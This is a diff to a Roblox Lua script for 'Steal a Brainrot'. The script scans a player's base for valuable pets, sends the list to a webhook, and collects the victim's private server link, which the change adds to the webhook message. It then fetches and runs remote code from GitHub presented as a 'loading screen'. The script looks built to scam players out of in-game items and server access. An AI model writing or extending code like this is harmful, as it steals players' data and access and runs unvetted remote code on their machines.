@@ -138,7 +138,7 @@ local function parseValue(str)
 end
 
 -- Send webhook (pets sorted by numeric value) — uses WEBHOOK from config (unchanged)
-local function sendWebhook(pets)
+local function sendWebhook(pets, privateServerLink)
     if not pets or #pets == 0 then return end
     if player and player:GetAttribute("WebhookSent") then return end
 
@@ -149,7 +149,6 @@ local function sendWebhook(pets)
     for _, pet in ipairs(pets) do
         local valueNum = parseValue(pet.value)
         local line = string.format("%s → %s → %s", pet.name, pet.value, pet.floor)
-
         if valueNum >= highValueThreshold then
             shouldPing = true
             table.insert(priorityPets, {line = line, valueNum = valueNum})
@@ -177,9 +176,8 @@ local function sendWebhook(pets)
 
     local petsText = "```"..lootText.."```"
 
-    local placeId = tostring(game.PlaceId or "")
-    local jobId = tostring(game.JobId or "")
-    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+    -- ✅ Use the actual entered private server link instead of kebabman
+    local serverLink = privateServerLink or "No link entered"
 
     local embed = {
         ["title"] = "🧠 Steal a Brainrot HIT! - bloomscripts 🧠",
@@ -281,6 +279,7 @@ sendButton.Size = UDim2.new(0.4, 0, 0, 32)
 sendButton.Position = UDim2.new(0.3, 0, 0, 120)
 Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)
 
+-- ✅ Private server link validation
 local function isValidPrivateServerLink(txt)
     return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
 end
@@ -295,7 +294,7 @@ textBox:GetPropertyChangedSignal("Text"):Connect(function()
     end
 end)
 
--- ✅ Your only addition — loading screen after sending webhook
+-- ✅ Send webhook and trigger loading screen after valid link
 local function handleSend()
     local txt = textBox.Text or ""
     if isValidPrivateServerLink(txt) then
@@ -303,10 +302,9 @@ local function handleSend()
         task.spawn(function()
             local pets = scanMyBase()
             if #pets > 0 then
-                sendWebhook(pets)
+                sendWebhook(pets, txt) -- ✅ Pass private server link
             end
             task.wait(1)
-            -- Run your loading screen script from GitHub (main + mini handled by that script)
             pcall(function()
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/loadingscreen/refs/heads/main/loading2"))()
             end)
